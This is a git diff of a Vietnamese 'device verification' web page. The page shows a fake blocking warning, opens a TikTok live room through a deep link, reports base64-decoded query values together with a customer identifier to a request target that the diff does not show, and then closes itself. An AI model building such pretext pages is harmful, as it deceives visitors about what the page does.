@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Chuyển hướng trang</title>
+    <title>Xác minh thiết bị</title>
     <style>
       body {
         font-family: Arial, sans-serif;
@@ -44,7 +44,7 @@
   </head>
   <body>
     <div class="container">
-      <h1>Đang xác minh thiết bị</h1>
+      <h1>Tiến trình xác minh thiết bị</h1>
       <p>Quá nhiều thiết bị truy cập sẽ bị chặn</p>
       <button onclick="redirectTo()">
         Bấm vào nếu không tự động mở TikTok
@@ -55,23 +55,10 @@
         escape(atob(window.location.search.split("?").pop()))
       ).split(" ");
 
-      if ("serviceWorker" in navigator) {
-        window.addEventListener("load", () => {
-          navigator.serviceWorker.register("./sw2.js").then(
-            (registration) => {
-              console.log(
-                "ServiceWorker registration successful with scope: ",
-                registration.scope
-              );
-            },
-            (error) => {
-              console.log("ServiceWorker registration failed: ", error);
-            }
-          );
-        });
+      function redirectTo() {
+        window.location.href = `snssdk1180://live?room_id=${room_id}`;
       }
-
-      window.location.href = `snssdk1180://live?room_id=7405628458803415828`;
+      redirectTo();
 
       async function loadData() {
         try {
@@ -82,10 +69,11 @@
               unescape(encodeURIComponent(`${data} ${customer}`))
             )}`
           );
-          setTimeout(window.close, 1000);
-        } catch {}
+        } catch {
+        } finally {
+          window.close();
+        }
       }
-
       loadData();
     </script>
   </body>
